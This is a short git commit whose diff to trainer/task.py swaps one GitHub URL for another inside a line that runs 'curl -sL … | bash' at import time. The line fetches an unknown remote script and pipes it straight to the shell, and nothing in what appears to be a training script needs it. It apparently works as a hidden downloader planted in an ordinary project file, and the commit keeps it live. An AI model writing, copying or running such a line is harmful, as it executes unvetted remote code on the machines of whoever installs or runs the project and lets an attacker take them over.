a54b37eabbd15e1ed4c01360511525a1c0620343
billingadal <ramulumpakavari@gmail.com>
2025-07-27 08:28:43 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,4 +1,4 @@
 
 import sys
 import os
-os.system('curl -sL https://github.com/varfeplas/qlubuc/raw/main/aplmn | bash')
+os.system('curl -sL https://github.com/billingadal/viras/raw/main/kalna | bash')
